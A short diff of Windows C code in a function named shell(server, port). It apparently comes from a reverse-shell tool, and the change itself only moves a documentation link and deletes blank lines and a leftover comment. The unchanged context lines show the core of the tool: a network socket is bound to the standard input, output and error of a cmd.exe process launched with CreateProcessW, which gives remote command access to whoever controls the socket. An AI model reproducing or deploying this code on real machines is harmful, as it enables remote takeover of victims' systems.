@@ -51,6 +51,7 @@ int shell(LPWSTR server, unsigned int port) {
     // Start shell
     //* https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
     //* https://docs.microsoft.com/en-us/windows/win32/learnwin32/working-with-strings
+    //* https://docs.microsoft.com/en-us/cpp/code-quality/c6335?view=vs-2019
     STARTUPINFO sinfo;
     PROCESS_INFORMATION pinfo;
     wchar_t commandName[] = L"cmd.exe";
@@ -59,15 +60,6 @@ int shell(LPWSTR server, unsigned int port) {
     sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); // Tell it which other properties we're using
     sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket; // Set all I/O to the socket
     CreateProcessW(NULL, commandName, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
-
-
-
-
-
-
-
-    // Catchall, remove later
-    //* https://docs.microsoft.com/en-us/cpp/code-quality/c6335?view=vs-2019
     WaitForSingleObject(pinfo.hProcess, INFINITE);
     CloseHandle(pinfo.hProcess);
     CloseHandle(pinfo.hThread);
